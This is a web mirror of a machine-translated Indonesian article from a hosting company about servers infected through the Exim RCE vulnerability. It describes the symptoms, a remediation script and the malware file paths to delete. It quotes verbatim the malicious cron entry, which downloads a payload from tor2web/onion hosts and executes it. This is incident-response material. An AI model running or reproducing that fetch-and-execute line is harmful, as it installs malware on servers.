<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>‚úîÔ∏è üßöüèæ üíé Gelombang pertama dipengaruhi oleh kerentanan Exim. Script untuk perawatan ü§© üßöüèª üë®üèø‚Äçüéì</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Kerentanan dengan RCE Exim sudah cukup sensasional, dan cukup banyak merusak saraf administrator sistem di seluruh dunia. 

 Segera setelah infeksi be...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Gelombang pertama dipengaruhi oleh kerentanan Exim. Script untuk perawatan</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/first/blog/455636/">  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Kerentanan dengan RCE Exim</a> sudah cukup sensasional, dan cukup banyak merusak saraf administrator sistem di seluruh dunia. <br><br>  Segera setelah infeksi besar (banyak klien kami menggunakan Exim sebagai server mail) mereka dengan cepat menyebarkan skrip untuk mengotomatisasi solusi untuk masalah tersebut.  Script ini jauh dari ideal dan penuh dengan kode suboptimal, tetapi ini adalah solusi pertempuran cepat agar tidak melakukan tindakan yang sama pada ratusan atau bahkan ribuan server. <br><br>  Ini bekerja pada server yang menjalankan Centos, RHEL, Debian, Ubuntu dengan server email Exim diinstal. <a name="habracut"></a><br><br><h2>  Bagaimana memahami bahwa server diretas? </h2><br>  Periksa proses yang sedang berjalan dengan perintah atas. <br>  Pada server yang terinfeksi, ada beban 100% yang dibuat oleh proses [kthrotlds].  Juga di penjadwal cron tugas ditambahkan dengan hak pengeditan terbatas. <br><br><h2>  Bagian Peringatan </h2><br>  Semua insiden infeksi yang kami temui memiliki tipe yang sama, gelombang kedua dan ketiga mungkin berbeda dari mereka - bagi mereka mungkin perlu memodifikasi skrip.  Pada saat infeksi, tugas-tugas dalam cron hilang tanpa dapat ditarik kembali dan mereka harus dikembalikan dengan tangan.  Script "memotong bahu" - pembaruan tanpa rasa takut Exim ke versi ditambal, dalam kasus Centos 6 bahkan dari repositori tes.  Contoh malware ada dalam memori, sehingga server <b>harus</b> dihidupkan ulang segera setelah membersihkan mahkota. <br><br>  <b>Penting:</b> kerentanan memungkinkan mengeksekusi kode dari root, yang tidak memberikan jaminan kesembuhan seratus persen.  Memiliki akses root ke server, Anda dapat menyembunyikan hampir semua hal di server ini, sehingga hampir tidak mungkin menemukannya.  Dijamin untuk benar-benar menyembuhkan server hanya dapat menginstal ulang lengkap, tetapi jauh dari selalu mungkin  Jika tidak ada kemungkinan untuk menginstal ulang server, dan gejalanya sama seperti yang dijelaskan, Anda dapat mencoba dengan cepat mengisi lubang dengan skrip ini. <br><br>  Dengan menggunakan skrip, Anda melakukan ini atas risiko dan risiko Anda sendiri: kami menguji skrip pada sejumlah server, namun, selalu ada risiko versi perangkat lunak yang tidak kompatibel atau konflik konfigurasi. <br>  Skrip kami juga memungkinkan Anda untuk menyembuhkan hanya satu dari kemungkinan implementasi infeksi - mungkin sekarang sudah ada cara lain untuk mengeksploitasi kerentanan yang belum masuk ke dalam pandangan kami. <br><br><h2>  Apa yang dilakukan skrip? </h2><br><br>  1. Pembaruan Exim, instal ulang ikal. <br>  2. Memeriksa infeksi di server. <br><br><div class="spoiler">  <b class="spoiler_title">Script menganalisis tugas-tugas penjadwal untuk keberadaan inklusi yang mencurigakan.</b> <div class="spoiler_text">  Misalnya, seperti: <br><br><pre><code class="plaintext hljs">*/11 * * * * root tbin=$(command -v passwd); bpath=$(dirname "${tbin}"); curl="curl"; if [ $(curl --version 2&gt;/dev/null|grep "curl "|wc -l) -eq 0 ]; then curl="echo"; if [ "${bpath}" != "" ]; then for f in ${bpath}*; do strings $f 2&gt;/dev/null|grep -q "CURLOPT_VERBOSE" &amp;&amp; curl="$f" &amp;&amp; break; done; fi; fi; wget="wget"; if [ $(wget --version 2&gt;/dev/null|grep "wgetrc "|wc -l) -eq 0 ]; then wget="echo"; if [ "${bpath}" != "" ]; then for f in ${bpath}*; do strings $f 2&gt;/dev/null|grep -q "to &lt;bug-wget@gnu.org&gt;" &amp;&amp; wget="$f" &amp;&amp; break; done; fi; fi; if [ $(cat /etc/hosts|grep -i ".onion."|wc -l) -ne 0 ]; then echo "127.0.0.1 localhost" &gt; /etc/hosts &gt;/dev/null 2&gt;&amp;1; fi; (${curl} -fsSLk --retry 2 --connect-timeout 22 --max-time 75 https://an7kmd2wp4xo7hpr.tor2web.su/src/ldm -o /.cache/.ntp||${curl} -fsSLk --retry 2 --connect-timeout 22 --max-time 75 https://an7kmd2wp4xo7hpr.tor2web.io/src/ldm -o /.cache/.ntp||${curl} -fsSLk --retry 2 --connect-timeout 22 --max-time 75 https://an7kmd2wp4xo7hpr.onion.sh/src/ldm -o /.cache/.ntp||${wget} --quiet --tries=2 --wait=5 --no-check-certificate --connect-timeout=22 --timeout=75 https://an7kmd2wp4xo7hpr.tor2web.su/src/ldm -O /.cache/.ntp||${wget} --quiet --tries=2 --wait=5 --no-check-certificate --connect-timeout=22 --timeout=75 https://an7kmd2wp4xo7hpr.tor2web.io/src/ldm -O /.cache/.ntp||${wget} --quiet --tries=2 --wait=5 --no-check-certificate --connect-timeout=22 --timeout=75 https://an7kmd2wp4xo7hpr.onion.sh/src/ldm -O /.cache/.ntp) &amp;&amp; chmod +x /.cache/.ntp &amp;&amp; /bin/sh /.cache/.ntp</code> </pre> <br></div></div><br>  2a.  Jika ada jejak skrip virus di folder / etc, lakukan hal berikut <br><br><ul><li>  berhenti cron </li><li>  membunuh proses yang diluncurkan oleh skrip virus </li><li>  membunuh curl wget sh proses empat kali (dijalankan oleh virus sesuai jadwal) </li><li>  membersihkan antrian email dari semua huruf (pesan yang terinfeksi sulit dipisahkan dari yang tidak berbahaya, jadi <b>Anda harus menghapus seluruh antrian</b> ) </li><li>  Mengizinkan penghapusan file tempat fragmen skrip berbahaya berada: <br><pre> <code class="plaintext hljs">/etc/cron.daily/cronlog /etc/cron.d/root /etc/cron.d/.cronbus /etc/cron.hourly/cronlog /etc/cron.monthly/cronlog /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.d/root /etc/crontab /root/.cache/ /root/.cache/a /usr/local/bin/nptd /root/.cache/.kswapd /usr/bin/\[kthrotlds\] /root/.ssh/authorized_keys /.cache/* /.cache/.sysud /.cache/.a /.cache/.favicon.ico /.cache/.kswapd /.cache/.ntp</code> </pre></li><li>  menghapus file-file ini </li><li>  menghapus pekerjaan autostart di /etc/rc.local </li><li>  menghapus kunci penyerang dari kunci ssh yang diizinkan </li><li>  menjalankan cron </li><li>  dan segera reboot server </li></ul><br>  2b.  Jika tidak ada jejak infeksi, skrip keluar. <br><br><h2>  Perbaikan </h2><br>  Virus menghapus semua pekerjaan penjadwal cron.  Oleh karena itu, setelah me-reboot server, mereka harus dikonfigurasi ulang atau dipulihkan dari cadangan. <br><br>  curl juga terinfeksi oleh virus, sehingga diinstal ulang. <br><br>  Diperlukan boot ulang (skrip dijalankan secara otomatis setelah perawatan) - jika tidak, malware disimpan dalam memori server dan direplikasi sendiri setiap 30 detik bahkan setelah menghapus file yang terinfeksi. <br><br><h2>  Bagaimana cara menggunakan </h2><br>  Secara tradisional: sebelum memulai, pastikan Anda memiliki salinan cadangan aktual dari data server. <br><br><h3>  Untuk menjalankan skrip: </h3><br>  Terhubung ke server melalui ssh sebagai pengguna dengan hak akses root.  Anda juga dapat menggunakan klien Shell di panel ISPmanager - Tools. <br><br>  Di terminal, masukkan perintah: <br><br><pre> <code class="plaintext hljs">wget https://lechillka.firstvds.ru/exim_rce_fixer.sh &amp;&amp; chmod +x exim_rce_fixer.sh &amp;&amp; ./exim_rce_fixer.sh</code> </pre> <br>  Harapkan skrip untuk menyelesaikan dan me-reboot server. <br><br>  Setelah reboot, periksa operasi server dan situs / aplikasi yang dihosting di dalamnya, konfigurasi ulang atau kembalikan tugas ke cron dari cadangan. <br><br><h2>  Dan akhirnya </h2><br>  Sebenarnya, skrip adalah <b>solusi sementara</b> untuk memulihkan server agar berfungsi, untuk pencegahan yang dijamin, solusi terbaik adalah beralih ke server baru dengan versi sistem operasi yang tidak lagi mengandung kerentanan. <br><br>  Semua rekomendasi untuk menyelesaikan / memproses skrip dipersilahkan.  Jika Anda menemukan gejala infeksi lain - tolong tunjukkan.  Kerjasama pada saat infeksi massal secara signifikan mengurangi waktu yang dibutuhkan untuk menghilangkan infeksi ini. <br><br>  Semoga beruntung <br><br>  UPD1: <a href="">Ditambahkan pada github</a> . <br>  <a href="">Kode sumber untuk skrip Malvari diunggah di sana, yang berhasil ditarik dari server yang terinfeksi</a> . <br>  UPD2: untuk Centos 6, rilis 4.92 datang dalam EPEL, sekarang di semua versi skrip diinstal dari repositori utama.  Awalnya, skrip diunduh 4,92 untuk Centos 6 dari EPEL / pengujian. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id455636/">https://habr.com/ru/post/id455636/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id455624/index.html">Korban hiper dan apa yang bisa dipelajari oleh perancang permainan dari mereka</a></li>
<li><a href="../id455626/index.html">Wallarm Offzone2019 HackQuest</a></li>
<li><a href="../id455630/index.html">Acara digital di Moskow dari 11 hingga 16 Juni</a></li>
<li><a href="../id455632/index.html">Perhatian! Bug berbahaya dalam implementasi C ++ std :: map :: merge dan std :: set :: merge di Visual Studio 2017</a></li>
<li><a href="../id455634/index.html">Matematika dan game "Set"</a></li>
<li><a href="../id455638/index.html">Alan Kay tidak menemukan benda</a></li>
<li><a href="../id455640/index.html">‚ÄúMesin Emosi‚Äù Marvin Minsky: Bab 4. ‚ÄúBagaimana Kita Mengenali Kesadaran‚Äù</a></li>
<li><a href="../id455642/index.html">Arsitektur layanan antrian pesan terdistribusi di Yandex.Cloud</a></li>
<li><a href="../id455644/index.html">Kami menggunakan data dalam praktik</a></li>
<li><a href="../id455646/index.html">Security Week 24: backdoors pabrik di smartphone Android</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>